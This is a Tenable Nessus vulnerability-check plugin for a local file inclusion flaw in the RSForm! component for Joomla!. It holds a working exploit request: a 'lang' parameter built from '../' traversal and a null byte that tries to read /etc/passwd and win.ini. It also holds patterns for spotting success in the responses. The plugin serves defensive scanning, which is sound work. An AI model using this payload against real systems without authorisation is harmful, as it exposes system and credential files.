#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(50830);
  script_version("$Revision: 1.14 $");
  script_cvs_date("$Date: 2017/05/19 13:58:07 $");

  script_bugtraq_id(44724);
  script_osvdb_id(69069);
  script_xref(name:"EDB-ID", value:"15443");

  script_name(english:"RSForm! Component for Joomla! 'lang' Parameter Local File Include");
  script_summary(english:"Attempts to read a local file.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by a
local file include vulnerability.");
  script_set_attribute(attribute:"description", value:
"The version of the RSForm! component for Joomla! running on the remote
host is affected by a local file include vulnerability due to improper
sanitization of user-supplied input to the 'lang' parameter before
using it in the forme.php script to include PHP code. An
unauthenticated, remote attacker can exploit this issue to disclose
arbitrary files or execute arbitrary PHP code on the remote host,
subject to the privileges of the web server user ID.

Note that the installation is also likely to be affected by a SQL
injection vulnerability; however, Nessus has not checked for this.");
  # https://www.rsjoomla.com/support/documentation/rsform-user-guide/changelog/rsform-changelog.html
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?63e6ced8");
  script_set_attribute(attribute:"solution", value:
"Upgrade to RSForm! version 1.0.6 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:F/RL:O/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2010/11/06");
  script_set_attribute(attribute:"patch_publication_date", value:"2010/11/08");
  script_set_attribute(attribute:"plugin_publication_date", value:"2010/11/29");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:joomla:joomla\!");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2010-2017 Tenable Network Security, Inc.");

  script_dependencies("joomla_detect.nasl", "os_fingerprint.nasl");
  script_require_keys("installed_sw/Joomla!", "www/PHP");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

app = "Joomla!";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);
dir = install['path'];
install_url =  build_url(port:port, qs:dir);

# Verify component is installed
plugin = "RSForm!";

# Check KB first
installed = get_kb_item("www/"+port+"/webapp_ext/"+plugin+" under "+dir);

if (!installed)
{
  checks = make_array();
  regexes = make_list();
  regexes[0] = make_list('<name>Forme<');
  checks["/administrator/components/com_forme/forme.xml"]=regexes;

  # Ensure plugin is installed
  installed = check_webapp_ext(
    checks : checks,
    dir    : dir,
    port   : port,
    ext    : plugin
  );

}
if (!installed) audit(AUDIT_WEB_APP_EXT_NOT_INST, app, install_url, plugin + " component");

# Try to retrieve a local file.
os = get_kb_item("Host/OS");
if (os && report_paranoia < 2)
{
  if ("Windows" >< os)
    files = make_list('/windows/win.ini','/winnt/win.ini');
  else
    files = make_list('/etc/passwd');
}
else files = make_list('/etc/passwd', '/windows/win.ini', '/winnt/win.ini', 'CHANGELOG.php');

file_pats = make_array();
file_pats['/etc/passwd'] = "root:.*:0:[01]:";
file_pats['/winnt/win.ini'] = "^\[[a-zA-Z\s]+\]|^; for 16-bit app support";
file_pats['/windows/win.ini'] = "^\[[a-zA-Z\s]+\]|^; for 16-bit app support";
file_pats['CHANGELOG.php'] = "^-* *[0-9]+\.[^ ]+( Stable)? Released? ";

vuln = FALSE;
error = FALSE;

foreach file (files)
{
  # Try to exploit the issue.
  if (file[0] == '/') traversal = mult_str(str:"../", nb:12);
  else traversal = mult_str(str:"../", nb:3);

  if (substr(file, strlen(file)-4) == ".php")
    exploit = traversal + substr(file, 0, strlen(file)-4-1);
  else
    exploit = traversal + file + "%00";

  url = '/?option=com_forme&func=thankyou&lang=' + exploit;

  res = http_send_recv3(method:"GET", item:dir+url, port:port, exit_on_fail:TRUE);

  # There's a problem if we see the expected contents.
  res = res[2];
  file_pat = file_pats[file];

  # There's a problem if...
  if (egrep(pattern:file_pats[file], string:res))
  {
    vuln = TRUE;
    contents = res;
    break;
  }
  # we get an error because magic_quotes was enabled
  else if (file + "\0.php" >< res)
  {
    vuln = TRUE;
    error = TRUE;
    contents = strstr(res, file);
    break;
  }
  # we get an error claiming the file doesn't exist
  else if (
    file + ".php): failed to open stream: No such file" >< res ||
    "include("+file+") [function.include]: failed to open stream: No such file" >< res
  )
  {
    vuln = TRUE;
    error = TRUE;
    contents = strstr(res, file);
    break;
  }
  # we get an error about open_basedir restriction.
  else if ("open_basedir restriction in effect. File(" >< res)
  {
    vuln = TRUE;
    error = TRUE;
    contents = strstr(res, "open_basedir");
    break;
  }
}
if (vuln)
{
  if (error)
  {
    security_report_v4(
      port        : port,
      severity    : SECURITY_HOLE,
      generic     : TRUE,
      request     : make_list(install_url + url),
      output      : contents,
      rep_extra   :
       'Note that Nessus was not able to directly exploit this issue;'+
       '\nhowever, based on the error below, the installation does appear to be'+
       '\naffected.'
    );
    exit(0);
  }
  if (os && "Windows" >< os) file = str_replace(find:'/', replace:'\\', string:file);
  security_report_v4(
    port        : port,
    severity    : SECURITY_HOLE,
    file        : file,
    request     : make_list(install_url + url),
    output      : chomp(contents),
    attach_type : 'text/plain'
  );
  exit(0);
}
else
  audit(AUDIT_WEB_APP_EXT_NOT_AFFECTED, app, install_url, plugin + " component");
